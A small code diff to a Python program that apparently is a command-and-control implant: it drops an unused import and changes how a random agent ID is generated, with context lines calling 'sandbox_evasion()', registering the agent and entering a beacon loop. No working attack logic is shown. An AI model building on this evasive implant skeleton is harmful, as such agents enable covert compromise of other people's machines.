@@ -1,4 +1,3 @@
-import configparser
 import argparse
 import datetime
 import sys
@@ -292,7 +291,7 @@ if __name__ == '__main__':
         sandbox_evasion()
         print('[+] Agent running')
 
-        agent_id = random.randrange(1000, 9999)
+        agent_id = randrange(1000, 9999)
         register()
 
         while True:
